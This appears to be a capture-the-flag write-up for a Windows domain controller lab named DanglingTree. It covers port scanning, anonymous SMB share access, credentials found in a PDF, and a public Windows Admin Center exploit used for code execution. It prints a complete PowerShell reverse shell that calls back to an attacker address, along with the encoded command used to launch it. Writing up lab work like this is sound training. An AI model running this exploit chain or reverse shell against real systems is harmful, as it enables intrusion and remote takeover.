# DanglingTree

---

<img width="1589" height="291" alt="image" src="https://github.com/user-attachments/assets/131510d3-3090-4df5-a8b3-5697b451c5ba" />

---

## nmap scan 

```ruby
└─$ nmap -sCV -Pn 10.129.13.249
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-26 17:33 UTC
Nmap scan report for 10.129.13.249
Host is up (0.41s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-27 00:41:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Not valid before: 2026-08-03T16:32:53
|_Not valid after:  2106-08-03T16:32:53
|_ssl-date: TLS randomness does not represent time
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=danglingtree-DC-CA
| Not valid before: 2026-03-26T05:34:19
|_Not valid after:  2114-03-26T05:44:18
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Not valid before: 2026-08-03T16:32:53
|_Not valid after:  2106-08-03T16:32:53
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Not valid before: 2026-08-03T16:32:53
|_Not valid after:  2106-08-03T16:32:53
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Not valid before: 2026-08-03T16:32:53
|_Not valid after:  2106-08-03T16:32:53
3389/tcp open  ms-wbt-server
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.danglingtree.htb
| Not valid before: 2026-08-26T00:35:05
|_Not valid after:  2027-02-25T00:35:05
| rdp-ntlm-info: 
|   Target_Name: DANGLINGTREE
|   NetBIOS_Domain_Name: DANGLINGTREE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: danglingtree.htb
|   DNS_Computer_Name: dc.danglingtree.htb
|   DNS_Tree_Name: danglingtree.htb
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-27T00:42:08+00:00
6600/tcp open  ssl/mshvlm?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=dc.danglingtree.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.danglingtree.htb
| Not valid before: 2026-03-26T05:41:20
|_Not valid after:  2027-03-26T05:41:20
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 403 Forbidden
|     Connection: close
|     Date: Thu, 27 Aug 2026 00:55:16 GMT
|     Cache-Control: no-store
|     Cache-Control: max-age=0
|     Pragma: no-cache
|     Set-Cookie: .AspNetCore.Antiforgery.7Eyhia2WOxE=CfDJ8HsozULo80ZBsxvkNAKguonUTNho_6RXJEycVnLEtBrifMHeqhBXn2H4Ja5jmlFV_enzvu4c4IiasAjb1ZVGZ-XrgBEAtk5S2rBnD1tvv7XHXz-I8BlSdkmqQ7YLU1hSYqPOqveDwnHjuv2P383sg80; path=/; secure; samesite=none; Partitioned
|     Set-Cookie: WAC-SESSION=76b6e866566a4fa78f530b392d474fec; expires=Fri, 28 Aug 2026 00:55:17 GMT; path=/; secure; samesite=lax; httponly
|     Set-Cookie: WAC-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: WAC-AAD=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: XSRF-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Strict-Transport-Security: max-age=5184000; includeSubDomains; preload
|     <!DOCTYPE html>
|     <html lang="en" xmlns="http://www.w3.org/1999/xhtml">
|     <head
|   HTTPOptions: 
|     HTTP/1.1 403 Forbidden
|     Connection: close
|     Date: Thu, 27 Aug 2026 00:55:18 GMT
|     Cache-Control: no-store
|     Cache-Control: max-age=0
|     Pragma: no-cache
|     Set-Cookie: .AspNetCore.Antiforgery.7Eyhia2WOxE=CfDJ8HsozULo80ZBsxvkNAKguolUpnAUPw_uEAgyQmB4fw0LMyfxXqi6UL5LZI0_h_0QpzaxlmP5HYu51WCeDk_XbI02X5E8gWy_8xbdCE6d9wIXTIGV4OJ4CfQ57ektdAqLg7PltglvhwB3lSdzTePb_h8; path=/; secure; samesite=none; Partitioned
|     Set-Cookie: WAC-SESSION=7cc5469511e348d292033e8338783f9d; expires=Fri, 28 Aug 2026 00:55:19 GMT; path=/; secure; samesite=lax; httponly
|     Set-Cookie: WAC-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: WAC-AAD=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: XSRF-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Strict-Transport-Security: max-age=5184000; includeSubDomains; preload
|     <!DOCTYPE html>
|     <html lang="en" xmlns="http://www.w3.org/1999/xhtml">
|_    <head

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.95%I=7%D=8/26%Time=6A8F2390%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\
SF:0\0\0");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-27T00:42:09
|_  start_date: N/A
|_clock-skew: mean: 7h07m07s, deviation: 0s, median: 7h07m07s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.58 seconds
                                                                                                                                                                            
┌──(kali㉿kali)-[~]

```

---

## SMB ENUM

```
smbclient -L //danglingtree.htb -N
```

<img width="970" height="300" alt="image" src="https://github.com/user-attachments/assets/9f183bd4-c52b-4b1a-ba0a-850676b71eb6" />

```
smbclient //danglingtree.htb/IT
```

<img width="1514" height="452" alt="image" src="https://github.com/user-attachments/assets/466ead8b-71db-48f1-b1ac-15ccbb241d43" />

## found pdf that have credentials 

<img width="1072" height="418" alt="image" src="https://github.com/user-attachments/assets/81d1353d-6579-4f95-a4c3-9a998f0a81a8" />

```
Username : anderson.w
Password : R3dT3am@Acc3ss#01
```

## in port **`6600`** found login portal login in it with credentials 

<img width="1918" height="636" alt="image" src="https://github.com/user-attachments/assets/cf355dd7-079a-4078-858a-eeec1ebc8600" />

## search for CVE for Windows Admin Center and found 

<img width="1238" height="363" alt="image" src="https://github.com/user-attachments/assets/e274d57e-0e2e-4c8d-9722-75a4e8cdd1c4" />

## and i found exploit to it 

```
git clone https://github.com/r3vpwnx/CVE-2026-26119.git
cd CVE-2026-26119
```

## exploit it 

```
python3 wac_rce.py 'anderson.w' 'R3dT3am@Acc3ss#01' 'whoami'
```

<img width="942" height="132" alt="image" src="https://github.com/user-attachments/assets/e2399ad9-5cd8-4084-b640-9f4b3fb2e2d6" />

## Generate a Reverse Shell Payload

```
# Create the proper UTF-16LE encoded base64 payload
cat > revshell.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.205',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF

# Convert to UTF-16LE and Base64 properly
iconv -f UTF-8 -t UTF-16LE revshell.ps1 | base64 -w 0 > revshell.b64

# Verify it's not empty
cat revshell.b64

```

```
# Execute with the proper base64
python3 wac_rce.py 'anderson.w' 'R3dT3am@Acc3ss#01' "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $(cat revshell.b64)"
```

<img width="1110" height="231" alt="image" src="https://github.com/user-attachments/assets/5c0a28ff-4731-4ad4-9a99-53c18830367a" />

---

